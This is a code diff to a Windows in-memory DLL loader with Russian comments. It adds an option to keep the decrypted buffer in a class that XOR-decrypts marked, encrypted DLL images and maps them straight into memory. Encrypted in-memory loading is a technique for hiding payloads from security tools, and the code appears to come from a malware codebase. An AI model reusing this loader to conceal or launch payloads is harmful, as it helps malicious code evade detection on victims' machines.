@@ -304,6 +304,9 @@ HMEMORYMODULE MemoryLoadLibrary(const void *data)
             MEM_COMMIT,
             PAGE_READWRITE);
 
+
+
+
 	if (code == NULL)
 	{
 		return NULL;
@@ -367,6 +370,9 @@ error:
 	MemoryFreeLibrary(result);
 	return NULL;
 }
+
+
+
 
 FARPROC MemoryGetProcAddress(HMEMORYMODULE module, const char *name)
 {
@@ -432,9 +438,12 @@ bool BuildImport(PVOID ImageBase)
 //                            TMemoryDLL
 //*****************************************************************************
 
-TMemoryDLL::TMemoryDLL(const void* DllBuf)
+TMemoryDLL::TMemoryDLL(const void* DllBuf, bool DuplicateBuffer)
 {
-	FHandle = NULL;
+	FHandle       = NULL;
+	FSize         = 0;
+	FSourceBuffer = NULL;
+
 	if (!DllBuf) return;
 
 	bool Encrypted = false;
@@ -449,27 +458,38 @@ TMemoryDLL::TMemoryDLL(const void* DllBuf)
 		Buf += ENCRYPTED_DLL_MARKER_SIZE;
 
 		// Получаем размер данных
-		DWORD Size = *(PDWORD)Buf;
+		FSize = *(PDWORD)Buf;
 		Buf += sizeof(DWORD);
 
-		if (Encrypted)
+		if (Encrypted || DuplicateBuffer)
 		{
 			// Расшифровываем данные
 
-			LPVOID NewBuf = MemAlloc(Size);
+			LPVOID NewBuf = MemAlloc(FSize);
 			if (!NewBuf) return;
 
 			// Копируем данные
-			m_memcpy(NewBuf, Buf, Size);
+			m_memcpy(NewBuf, Buf, FSize);
 			Buf = (LPBYTE)NewBuf;
 
-			XORCrypt::Crypt(GetSessionPassword(), Buf, Size);
+			if (Encrypted)
+				XORCrypt::Crypt(GetSessionPassword(), Buf, FSize);
+
+			if (DuplicateBuffer)
+                FSourceBuffer = Buf;
 		}
 	}
 
 	FHandle = MemoryLoadLibrary(Buf);
 
-	if (Encrypted)
+	if (!FHandle)
+	{
+		FSize = 0;
+		FSourceBuffer = NULL;
+	}
+
+
+	if (Encrypted && !DuplicateBuffer)
 		MemFree(Buf);
 }
 //----------------------------------------------------------------------------
@@ -477,6 +497,8 @@ TMemoryDLL::TMemoryDLL(const void* DllBuf)
 
 TMemoryDLL::~TMemoryDLL()
 {
+	if (FSourceBuffer)
+		MemFree(FSourceBuffer);
 	if (FHandle)
 		MemoryFreeLibrary(FHandle);
 }
